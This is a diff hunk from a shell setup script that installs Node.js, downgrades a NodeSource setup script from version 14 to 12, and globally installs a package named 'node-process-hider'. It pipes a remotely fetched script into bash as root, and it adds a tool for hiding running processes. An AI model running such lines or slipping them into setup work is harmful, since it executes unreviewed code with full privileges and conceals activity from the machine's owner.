@@ -8,7 +8,7 @@ sudo apt-get install -y nodejs
 
 apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
 
-curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
